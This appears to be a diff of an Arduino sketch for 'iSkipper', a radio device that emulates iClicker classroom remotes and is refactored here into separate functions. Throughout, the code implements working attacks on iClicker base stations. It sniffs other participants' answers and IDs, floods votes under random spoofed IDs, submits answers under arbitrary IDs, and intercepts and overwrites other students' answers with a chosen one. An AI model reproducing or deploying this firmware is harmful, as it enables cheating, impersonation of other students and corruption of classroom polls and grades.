@@ -1,51 +1,55 @@
 /*
- Name:		iSkipper_Arduino_Sketch.ino
- Created:	2018/3/14 11:54:15
+ Name:		iSkipper_Arduino_Sketch_New.ino
+ Created:	2019/2/12 2:09:07
  Author:	CSR
 */
 
-#include "iClickerEmulator.h"
+#include <iClickerEmulator.h>
+#include <RingBufCPP.h>
 #include "SerialSymbols.h"
 #include <string.h>
+#include <assert.h>
 
-/*For Arduino Nano and RFM69HW*/
-#define IS_RFM69HW true //make true if using w version
-#define IRQ_PIN 3		// Must Be 3 for Nano
-#define CSN 10			// NSS pin,10 for Nano
-/*End For Arduino Nano and RFM69HW*/
+/*************************Change These Constants Below To Fit Your Hardware!***************************/
+/**/                                                                                                /**/
+/**/#define IS_RFM69HW true //make true if using w version                                          /**/
+/**/#define IRQ_PIN 3       // Must Be 3 for Arduino Nano                                           /**/
+/**/#define CSN 10          // NSS pin,10 for Arduino Nano                                          /**/
+/**/constexpr uint32_t FIXED_ISKIPPER_ID = 0xCDCDCDCD;//The Fixed ID for emulating a normal iClikcer/**/
+/**/                                                                                                /**/
+/*************************Change These Constants Above To Fit Your Hardware!***************************/
 
-#define MAX_BUFFERED_PACKETS 20 //The capability of receiving buffer
-#define SERIAL_BUFFER_SIZE 64
-#define ARGUMENTS_SIZE 61
 
-char serialBuffer[SERIAL_BUFFER_SIZE];
-char operationArguments[ARGUMENTS_SIZE];
-char replaceAnswer = 'A';
-uint8_t serialReadLength = 0;
+/*Important Constants*/
+#define SERIAL_BAUD_RATE 115200 //Baud rate
+#define MAX_BUFFERED_PACKETS 5 //The capability of radio receiving buffer
+#define MAX_SERIAL_COMMAND_LENGTH 20 //The max length of the command from serial ports
+#define SERIAL_NO_COMMAND_WAIT_TIME 3000 //The waiting time to promote for input if there is no input command
+/*End Important Constants*/
 
+//Global Variables
+char serialCommand[MAX_SERIAL_COMMAND_LENGTH];
+RingBufCPP<iClickerPacket, MAX_BUFFERED_PACKETS> recvBuf;
 iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);
-
-//The Fixed ID for emulating a normal iClikcer
-const uint32_t FIXED_ISKIPPER_ID = 0xCDCDCDCD;
 
 // the setup function runs once when you press reset or power the board
 void setup()
 {
-	Serial.begin(115200);
+	Serial.begin(SERIAL_BAUD_RATE);
 	clicker.begin(iClickerChannels::AA);
 	uint8_t thisID[4];
 	intToByteArray(FIXED_ISKIPPER_ID, thisID);
 	while (Serial.read() != OP_COMFIRM_CONNECTION) //Wait until connect
 	{
 		Serial.println(F("Initialization Complete. Waiting for COM command..."));
-		for (uint16_t wait = 3000; wait > 0; wait--)
+		for (uint16_t wait = SERIAL_NO_COMMAND_WAIT_TIME; wait > 0; wait--)
 		{
 			if (Serial.available() > 0)
 				break;
 			delay(1);
 		}
 	}
-	/*Respons Format:
+	/*Connection Response Format:
 	*	Connection Established! iSkipper ID:\n
 	*	[ACK]\n
 	*	[ID]\n
@@ -60,154 +64,40 @@ void setup()
 // the loop function runs over and over again until power down or reset
 void loop()
 {
-	char op = processSerialInput(); //Get operation(command) char from serial input
+	char op = processSerialInput(serialCommand, sizeof(serialCommand));
 	switch (op)
 	{
-	//Capture Mode
 	case OP_CAPTURE:
 	{
-		Serial.println(F("Start capture"));
-		Serial.println(RES_SUCCESS);
-		clicker.startPromiscuous(CHANNEL_SEND, capturePacketHandler);
-		while (Serial.read() != OP_STOP)
-		{
-		}
-		clicker.stopPromiscuous();
-		Serial.println(F("End Capture"));
-		break;
-	}
-	//Attack Mode
-	case OP_ATTACK:
-	{
-		/*Command Format:
-		*	A,<Answer>,<Counts>/0
-		*/
-		Serial.println(F("Start Attack"));
-		Serial.println(RES_SUCCESS);
-		//parsing arguments
-		char cAns = operationArguments[0];
-		unsigned long iAttackCount = strtoul(&operationArguments[2], NULL, 10);
-
-		Serial.println(iAttackCount);
-
-		uint8_t id[ICLICKER_ID_LEN];
-		iClickerAnswer_t ans;
-		for (unsigned long i = 1; i <= iAttackCount; i++)
-		{
-			if ((cAns >= 'A' && cAns <= 'E') || cAns == 'P')
-				ans = clicker.charAnswer(cAns);
-			else
-				ans = clicker.randomAnswer();
-			clicker.randomId(id);
-			clicker.submitAnswer(id, ans, false);
-			Serial.print(".");
-			if (i % 40 == 0)
-				Serial.println();
-			if (cAns != 'P')
-				delay(5);
-			if (Serial.read() == OP_STOP)
-				break;
-		}
-
-		Serial.println(F("\nAttack Finished"));
-		break;
-	}
-	case OP_ANSWER:
-	{
-		char ans = operationArguments[0];
-		uint8_t thisID[4];
-		intToByteArray(FIXED_ISKIPPER_ID, thisID);
-		Serial.println(F("Submit Answer:"));
-		Serial.println(ans);
-		for (int i = 0; i < 10; i++)
-		{
-			clicker.submitAnswer(thisID, clicker.charAnswer(ans), false);
-			Serial.println(F("Submit Success!"));
-			//if (clicker.submitAnswer(intToByteArray(FIXED_ISKIPPER_ID), clicker.charAnswer(ans), true))
-			//{
-			//	Serial.println(F("Submit Success!"));
-			//}
-			//else
-			//{
-			//	Serial.println(F("Submit Fail!"));
-			//}
-		}
-		break;
-	}
-
-	case OP_CHANGE_CHANNEL:
-	{
-		/*Command Format:
-		*	c,<Channel>/0
-		*/
-		clicker.setChannel(getChannelByString(operationArguments));
-		if (operationArguments[0] > 'D' || operationArguments[0] < 'A' || operationArguments[1] > 'D' || operationArguments[1] < 'A')
-		{
-			Serial.println(F("Illegal input Channel, set to default AA channel"));
-		}
-		else
-		{
-			Serial.println(RES_SUCCESS);
-			Serial.print(F("Successfully change channel to: "));
-			Serial.print(operationArguments[0]);
-			Serial.print(operationArguments[1]);
-			Serial.println();
-		}
-
+		capture();
 		break;
 	}
 	case OP_SUBMIT:
 	{
-		Serial.println(RES_SUCCESS);
-		Serial.println(F("Start SUBMIT mode, waiting for input..."));
-
-		//loop for input answers and IDs
-		/*Format:
-		*	<Answer>,<ID>\0
-		*/
-		while (1)
-		{
-
-			if (Serial.available() <= 0)
-			{
-				continue;
-			}
-			char answerAndID[11];
-			Serial.readBytesUntil('\0', answerAndID, 11); //Answer for 1 byte, comma for 1 byte, ID for 8 byte,\0 for 1 byte
-			answerAndID[10] = '\0';
-			if (answerAndID[0] == OP_STOP)
-			{
-				break;
-			}
-			char cAns = answerAndID[0];
-			uint32_t iID = strtoul(&answerAndID[2], NULL, 16);
-			uint8_t arrID[4];
-			intToByteArray(iID, arrID);
-			//Serial.println(input);
-			//char strID[9];
-			//snprintf(strID, sizeof(strID), "%02X%02X%02X%02X", arrID[0], arrID[1], arrID[2], arrID[3]);
-			//Serial.println(strID);
-			if (!clicker.validId(arrID))
-			{
-				Serial.println(F("Invalid ID"));
-				continue;
-			}
-			clicker.submitAnswer(arrID, clicker.charAnswer(cAns), false);
-			Serial.println(RES_SUCCESS);
-		}
+		submitMode();
 		break;
 	}
-
+	case OP_ANSWER:
+	{
+		//Repeat 10 times to make sure it succeed, since we can't decode ACK from the base.
+		answer(serialCommand[0], 10);
+		break;
+	}
+	case OP_CHANGE_CHANNEL:
+	{
+		changeChannel(serialCommand);
+		break;
+	}
+	case OP_ATTACK:
+	{
+		attack(serialCommand[0], strtoul(&serialCommand[2], NULL, 10));
+		break;
+	}
 	case OP_REPLACE:
 	{
-		Serial.println(F("Start replace"));
-		replaceAnswer =  operationArguments[0];
-		clicker.startPromiscuous(CHANNEL_SEND, replacePacketHandler);
-		while (Serial.read() != OP_STOP){}
-		clicker.stopPromiscuous();
-		Serial.println(F("End replace"));
+		replace(serialCommand[0]);
+		break;
 	}
-
 	case OP_RESET:
 	{
 		reset();
@@ -215,88 +105,224 @@ void loop()
 	}
 	default:
 	{
-		Serial.println(RES_STANDBY);
-		Serial.println(F("No Running Progress, waiting for commands..."));
-		for (uint16_t wait = 3000; wait > 0; wait--)
-		{
-			if (Serial.available() > 0)
-				break;
-			delay(1);
-		}
+		idle();
 		break;
 	}
 	}
-	//End Switch
 
-	//cleanBuffers();
+}
+
+void recvPacketHandler(iClickerPacket *recvd)
+{
+	recvBuf.add(*recvd);
+}
+
+static inline void idle()
+{
+	Serial.println(RES_STANDBY);
+	Serial.println(F("No Running Progress, waiting for commands..."));
+	for (uint16_t wait = SERIAL_NO_COMMAND_WAIT_TIME; wait > 0; wait--)
+	{
+		if (Serial.available() > 0)
+			break;
+		delay(1);
+	}
+	return;
+}
+
+static inline void capture()
+{
+	/*Start Capturing Response Format:
+	*	Start capture\n
+	*	[ACK]\n
+	*/
+	Serial.println(F("Start capture"));
+	Serial.println(RES_SUCCESS);
+
+	const char reponseFormat[] = "Captured,%c,%02X%02X%02X%02X\n"; //Reponse Format
+	iClickerPacket r;
+	const uint8_t* id;
+	char ans;
+	char msg[50];
+	clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
+	while (!shouldStop())
+	{
+		while (recvBuf.pull(&r))
+		{
+			id = r.packet.answerPacket.id;
+			ans = iClickerEmulator::answerChar((iClickerAnswer)r.packet.answerPacket.answer);
+			snprintf(msg, sizeof(msg), reponseFormat, ans, id[0], id[1], id[2], id[3]);
+			Serial.print(msg);
+		}
+	}
+	clicker.stopPromiscuous();
+	Serial.println(F("End Capture"));
+}
+
+static inline void answer(const char cAns, const uint8_t repeat)
+{
+	uint8_t thisID[4];
+	intToByteArray(FIXED_ISKIPPER_ID, thisID);
+	Serial.println(F("Submit Answer:"));
+	Serial.println(cAns);
+	for (uint8_t i = 0; i < repeat; i++)
+	{
+		clicker.submitAnswer(thisID, clicker.charAnswer(cAns), false);
+		Serial.println(F("Submit Success!"));
+		Serial.println(RES_SUCCESS);
+	}
+}
+
+static inline void submitMode()
+{
+	Serial.println(F("Start SUBMIT mode, waiting for input..."));
+	Serial.println(RES_SUCCESS);
+	/*Format:
+	*	<Answer>,<ID>\0
+	*/
+	uint8_t readLength = 0;
+	char answerAndID[11];//Answer for 1 byte, comma for 1 byte, ID for 8 byte,\0 for 1 byte
+	while (true)
+	{
+		while (readLength < sizeof(answerAndID) - 1)
+		{
+			while (Serial.available() <= 0);//Wait for input
+			char c = 0;
+			Serial.readBytes(&c, 1);
+			if (c == OP_STOP)
+				goto end; //End here
+			answerAndID[readLength++] = c;
+			if (c == '\0' && readLength != sizeof(answerAndID) - 1)//That means the input is not in correct forms.
+			{
+				readLength = 0;
+				continue;
+			}
+		}
+		readLength = 0;
+		char cAns = answerAndID[0];
+		uint32_t iID = strtoul(&answerAndID[2], NULL, 16);
+		uint8_t arrID[4];
+		intToByteArray(iID, arrID);
+		if (!clicker.validId(arrID))
+		{
+			Serial.println(F("Invalid ID"));
+			continue;
+		}
+		clicker.submitAnswer(arrID, clicker.charAnswer(cAns), false);
+		Serial.println(RES_SUCCESS);
+	}
+end:
+	Serial.println(F("End SUBMIT mode."));
+	return;
+}
+
+static inline void attack(const char cAns, unsigned long count)
+{
+	/*Command Format:
+	*	A,<Answer>,<Counts>/0
+	*Start attacking Response Format:
+	*	Start Attack\n
+	*	[ACK]\n
+	*/
+	Serial.println(F("Start Attack"));
+	Serial.println(RES_SUCCESS);
+	iClickerAnswer ans;
+	uint8_t id[ICLICKER_ID_LEN];
+	for (unsigned long i = 0; i < count && !shouldStop(); i++)
+	{
+		if ((cAns >= 'A' && cAns <= 'E') || cAns == 'P')
+			ans = clicker.charAnswer(cAns);
+		else
+			ans = clicker.randomAnswer();
+		clicker.randomId(id);
+		clicker.submitAnswer(id, ans, false);
+		Serial.print(".");
+		if (i % 10 == 0)
+			Serial.println();
+		if (cAns != 'P')
+			delay(5); //To make recieved count be accurate.
+	}
+	Serial.println(F("\nAttack Finished"));
+}
+
+static inline void changeChannel(const char* const arguments)
+{
+	/*Command Format:
+	*	c,<Channel>/0
+	*/
+	clicker.setChannel(getChannelByString(arguments));
+	if (arguments[0] > 'D' || arguments[0] < 'A' || arguments[1] > 'D' || arguments[1] < 'A')
+	{
+		Serial.println(F("Illegal input Channel, set to default AA channel"));
+		Serial.println(RES_FAIL);
+	}
+	else
+	{
+		Serial.println(RES_SUCCESS);
+		Serial.print(F("Successfully change channel to: "));
+		Serial.print(arguments[0]);
+		Serial.print(arguments[1]);
+		Serial.println();
+	}
+}
+
+static inline void replace(const char cTargetAns)
+{
+	/*Start Replacing Response Format:
+	*	Start capture\n
+	*	[ACK]\n
+	*/
+	Serial.println(F("Start Replacing"));
+	Serial.println(RES_SUCCESS);
+
+	const char reponseFormat[] = "Replaced,%c,%02X%02X%02X%02X\n"; //Reponse Format
+	iClickerPacket r;
+	uint8_t* id;
+	char ans;
+	char msg[50];
+	clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
+	while (!shouldStop())
+	{
+		while (recvBuf.pull(&r))
+		{
+			id = r.packet.answerPacket.id;
+			ans = iClickerEmulator::answerChar((iClickerAnswer)r.packet.answerPacket.answer);
+			clicker.submitAnswer(id, clicker.charAnswer(cTargetAns));
+			snprintf(msg, sizeof(msg), reponseFormat, ans, id[0], id[1], id[2], id[3]);
+			Serial.print(msg);
+		}
+		clicker.startPromiscuous(CHANNEL_SEND, recvPacketHandler);
+	}
+	clicker.stopPromiscuous();
+	Serial.println(F("End Replacing"));
 }
 
 /*
 *Read input commands from Serial ports
 *Here are the command formats:
 *		<COMMAND_CHAR>+','+<COMMAND_ARGUMENTS>+'\0'
-*Since the Arduino's serial buffer is 64bytes, the command arguments should be not longer than 61bytes
+*Returns the COMMAND_CHAR input command, and store arguments into argument[].
 */
-char processSerialInput()
+static inline char processSerialInput(char* const argument, const uint16_t size)
 {
 	if (Serial.available() > 0)
 	{
-		//delay(30);//waiting for fully receiving
-		serialReadLength = Serial.readBytesUntil('\0', serialBuffer, SERIAL_BUFFER_SIZE);
-		serialBuffer[serialReadLength] = '\0';
-		char cOperation = serialBuffer[0];
-		strlcpy(operationArguments, &serialBuffer[2], ARGUMENTS_SIZE);
-/*		Serial.println(F("Command received:"));
-		//for (register uint16_t i = 0; i < SERIAL_BUFFER_SIZE; i++)
-		//{
-		//	Serial.print((byte)serialBuffer[i]);
-		//	Serial.print(' ');
-		//}
-		Serial.println(serialBuffer);
-		Serial.println(F("Operation:"));
-		Serial.println(cOperation);
-		Serial.println(F("Arguments:"));
-		Serial.println(operationArguments);
-*/
+		size_t readLength = Serial.readBytesUntil('\0', argument, size);
+		argument[readLength] = '\0';
+		char cOperation = argument[0];
+		//Shift left
+		for (uint8_t i = 0; i < size - 2; i++)
+		{
+			argument[i] = argument[i + 2];
+		}
 		return cOperation;
 	}
 	return OP_INVALID_OPERATION;
 }
 
-// reset function jump to address 0
-void reset()
-{
-	__asm("jmp 0");
-}
-
-void cleanBuffers()
-{
-	for (register uint16_t i = 0; i < SERIAL_BUFFER_SIZE; i++)
-	{
-		serialBuffer[i] = 0;
-	}
-	for (register uint16_t i = 0; i < ARGUMENTS_SIZE; i++)
-	{
-		operationArguments[i] = 0;
-	}
-}
-
-//return the Channel base on the first two chars in string, return AA if illegal input
-iClickerChannel getChannelByString(char *str)
-{
-	int index = (str[0] - 'A') * 4 + (str[1] - 'A'); //Calculate channel index in channels[] array
-	if (index > NUM_ICLICKER_CHANNELS - 1 || index < 0)
-		return iClickerChannels::channels[0]; //return AA if illegal input
-	return iClickerChannels::channels[index];
-}
-
-inline bool isDigit(char c)
-{
-	return c >= '0' && c <= '9';
-}
 
 //Output pointer must point to an array of exactly 4 Byte.
-void intToByteArray(uint32_t input, uint8_t *output)
+static inline void intToByteArray(const uint32_t input, uint8_t output[4])
 {
 	output[0] = input >> 24;
 	output[1] = input >> 16 & 0xFF;
@@ -304,20 +330,27 @@ void intToByteArray(uint32_t input, uint8_t *output)
 	output[3] = input & 0xFF;
 }
 
-void capturePacketHandler(iClickerPacket_t *recvd)
+//Return the Channel base on the first two chars in string, return AA if illegal input. 
+static iClickerChannel getChannelByString(const char *const str)
 {
-	char strCaptureResponse[30];
-	uint8_t *id = recvd->packet.answerPacket.id;
-	char answer = iClickerEmulator::answerChar((iClickerAnswer_t)recvd->packet.answerPacket.answer);
-	snprintf(strCaptureResponse, sizeof(strCaptureResponse), "Captured,%c,%02X%02X%02X%02X\n", answer, id[0], id[1], id[2], id[3]);
-	Serial.print(strCaptureResponse);
+	uint16_t index = (str[0] - 'A') * 4 + (str[1] - 'A'); //Calculate channel index in channels[] array
+	if (index > NUM_ICLICKER_CHANNELS - 1 || index < 0)
+		return iClickerChannels::channels[0]; //return AA if illegal input
+	return iClickerChannels::channels[index];
 }
 
-void replacePacketHandler (iClickerPacket_t *recvd)
+//Check whether there is an OP_STOP recieved
+static inline bool shouldStop()
 {
-	capturePacketHandler(recvd);
-	clicker.stopPromiscuous();
-	clicker.submitAnswer(recvd->packet.answerPacket.id,clicker.charAnswer(replaceAnswer));
-	Serial.println("Replace success!");
-	clicker.startPromiscuous(CHANNEL_SEND, replacePacketHandler);
+	return Serial.read() == OP_STOP;
 }
+
+//Reset function jump to address 0, this would not fix problem caused by wild pointers.
+static inline void reset()
+{
+	__asm("jmp 0");
+}
+
+//Check validation of fixed id
+static_assert(((FIXED_ISKIPPER_ID >> 24) ^ (FIXED_ISKIPPER_ID >> 16 & 0xFF) ^ (FIXED_ISKIPPER_ID >> 8 & 0xFF)) == (FIXED_ISKIPPER_ID & 0xFF),
+	"Your FIXED_ISKIPPER_ID is not valid!");
